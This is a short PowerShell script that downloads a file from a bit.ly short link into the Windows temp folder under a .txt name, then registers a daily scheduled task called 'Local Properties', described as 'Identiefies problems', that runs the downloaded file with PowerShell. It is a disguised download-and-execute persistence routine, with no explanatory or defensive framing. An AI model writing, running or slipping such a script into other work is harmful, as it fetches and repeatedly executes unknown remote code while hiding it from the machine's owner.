(New-Object Net.WebClient).DownloadFile('https://bit.ly/2TPR0lG','C:\WINDOWS\TEMP\local.txt')

$action = New-ScheduledTaskAction -Execute 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe' -Argument 'C:\WINDOWS\TEMP\local.txt'

$trigger = New-ScheduledTaskTrigger -Daily -At 9am

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Local Properties' -Description 'Identiefies problems'



